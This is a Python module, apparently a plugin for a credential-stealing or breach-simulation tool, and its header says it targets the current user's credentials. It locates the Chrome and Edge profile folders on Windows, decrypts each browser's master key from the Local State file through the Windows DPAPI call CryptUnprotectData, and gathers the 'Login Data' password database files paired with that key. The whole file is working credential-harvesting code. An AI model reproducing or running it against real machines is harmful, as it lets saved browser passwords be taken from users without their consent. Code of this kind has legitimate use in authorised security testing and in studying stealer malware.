# NOTE: This only tries stealing credentials from the current user,
#       so no DPAPI logic is implemented yet. That requires more research.
#       We can decide to do this now or in a new version of the plugin.
#       (WinAPI is used for current user, DPAPI is used otherwise.)


import base64
import getpass
import json
import logging
from ctypes import (
    POINTER,
    Structure,
    WinDLL,
    byref,
    c_buffer,
    c_char,
    create_string_buffer,
    memmove,
    sizeof,
)
from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPCWSTR, LPVOID, LPWSTR
from pathlib import Path, PureWindowsPath
from typing import Dict, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]


class CRYPTPROTECT_PROMPTSTRUCT(Structure):
    _fields_ = [
        ("cbSize", DWORD),
        ("dwPromptFlags", DWORD),
        ("hwndApp", HWND),
        ("szPrompt", LPCWSTR),
    ]


PCRYPTPROTECT_PROMPTSTRUCT = POINTER(CRYPTPROTECT_PROMPTSTRUCT)

crypt32 = WinDLL("crypt32", use_last_error=True)
kernel32 = WinDLL("kernel32", use_last_error=True)

LocalFree = kernel32.LocalFree
LocalFree.restype = HANDLE
LocalFree.argtypes = [HANDLE]

CryptUnprotectData = crypt32.CryptUnprotectData
CryptUnprotectData.restype = BOOL
CryptUnprotectData.argtypes = [
    POINTER(DATA_BLOB),
    POINTER(LPWSTR),
    POINTER(DATA_BLOB),
    LPVOID,
    PCRYPTPROTECT_PROMPTSTRUCT,
    DWORD,
    POINTER(DATA_BLOB),
]


def getData(blobOut):
    cbData = blobOut.cbData
    pbData = blobOut.pbData
    buffer = create_string_buffer(cbData)
    memmove(buffer, pbData, sizeof(buffer))
    LocalFree(pbData)
    return buffer.raw


def Win32CryptUnprotectData(cipherText, entropy=False):
    decrypted = None

    bufferIn = c_buffer(cipherText, len(cipherText))
    blobIn = DATA_BLOB(len(cipherText), bufferIn)
    blobOut = DATA_BLOB()

    if entropy:
        bufferEntropy = c_buffer(entropy, len(entropy))
        blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)

        if CryptUnprotectData(
            byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)
        ):
            decrypted = getData(blobOut)

    else:
        if CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut)):
            decrypted = getData(blobOut)

    return decrypted


DRIVE = "C"
LOCAL_APPDATA = "{drive}:\\Users\\{user}\\AppData\\Local"

WINDOWS_BROWSERS = {
    "Chromium Edge": "{local_appdata}\\Microsoft\\Edge\\User Data",
    "Google Chrome": "{local_appdata}\\Google\\Chrome\\User Data",
}


class WindowsCredentialsDatabaseSelector:
    def __init__(self):
        user = getpass.getuser()
        local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)

        self._browsers: Dict[str, PureWindowsPath] = {}
        for browser_name, browser_directory in WINDOWS_BROWSERS.items():
            self._browsers[browser_name] = PureWindowsPath(
                browser_directory.format(local_appdata=local_appdata)
            )

    def __call__(self) -> Set[Tuple[PureWindowsPath, Optional[bytes]]]:
        """
        Get browsers' credentials' database directories for current user
        """

        databases: Set[Tuple[PureWindowsPath, Optional[bytes]]] = set()

        for browser_name, browser_local_data_directory_path in self._browsers.items():
            logger.info(f'Attempting to locate credentials database for browser "{browser_name}"')

            browser_databases = (
                WindowsCredentialsDatabaseSelector._get_credentials_database_paths_for_browser(
                    browser_local_data_directory_path
                )
            )

            logger.info(
                f"Found {len(browser_databases)} credentials databases "
                f'for browser "{browser_name}"'
            )

            databases = databases.union(browser_databases)

        return databases

    @staticmethod
    def _get_credentials_database_paths_for_browser(
        browser_local_data_directory_path: PureWindowsPath,
    ) -> Set[Tuple[PureWindowsPath, Optional[bytes]]]:
        paths: Set[Tuple[PureWindowsPath, Optional[bytes]]] = set()
        master_key = None

        local_state_file_path = browser_local_data_directory_path / Path("Local State")
        if not local_state_file_path.exists():  # type: ignore [attr-defined]
            return paths

        browser_profiles = WindowsCredentialsDatabaseSelector._get_browser_profiles(
            browser_local_data_directory_path
        )

        with open(local_state_file_path) as f:
            try:
                local_state_object = json.load(f)
            except json.decoder.JSONDecodeError as err:
                logger.error(f'Couldn\'t deserialize JSON file at "{local_state_file_path}": {err}')
                local_state_object = {}

            try:
                # add user profiles from "Local State" file
                browser_profiles = browser_profiles.union(
                    set(local_state_object["profile"]["info_cache"])
                )
            except Exception as err:
                logger.error(
                    "Exception encountered while trying to load user profiles "
                    f"from browser's local state: {err}"
                )

            try:
                master_key = base64.b64decode(local_state_object["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = Win32CryptUnprotectData(
                    master_key,
                )
            except Exception as err:
                logger.error(
                    "Exception encountered while trying to get master key "
                    f"from browser's local state: {err}"
                )
                master_key = None

        paths_for_each_profile = WindowsCredentialsDatabaseSelector._get_credentials_database_paths_for_each_user_profile(  # noqa: E501
            browser_local_data_directory_path, browser_profiles, master_key
        )

        paths = paths.union(paths_for_each_profile)

        return paths

    @staticmethod
    def _get_browser_profiles(browser_local_data_directory_path: PureWindowsPath) -> Set[str]:
        """
        Gets all user profiles from the browser
        """

        # empty string means current dir, without a profile
        browser_profiles = {"Default", ""}

        # get all additional browser profiles
        for item in browser_local_data_directory_path.iterdir():  # type: ignore [attr-defined]
            if item.isdir() and item.name.startswith("Profile"):
                browser_profiles.add(item.name)

        return browser_profiles

    @staticmethod
    def _get_credentials_database_paths_for_each_user_profile(
        browser_local_data_directory_path: PureWindowsPath,
        browser_profiles: Set[str],
        master_key: Optional[bytes],
    ) -> Set[Tuple[PureWindowsPath, Optional[bytes]]]:
        paths: Set[Tuple[PureWindowsPath, Optional[bytes]]] = set()

        for profile in browser_profiles:
            try:
                profile_directory = browser_local_data_directory_path / Path(profile)
                db_files = profile_directory.iterdir()  # type: ignore [attr-defined]
            except Exception as err:
                logger.error(
                    "Exception encountered while trying to get "
                    f'password database file for user profile "{profile}": {err}'
                )

            for db in db_files:
                if db.name.lower() == "login data":
                    paths.add((db, master_key))

        return paths
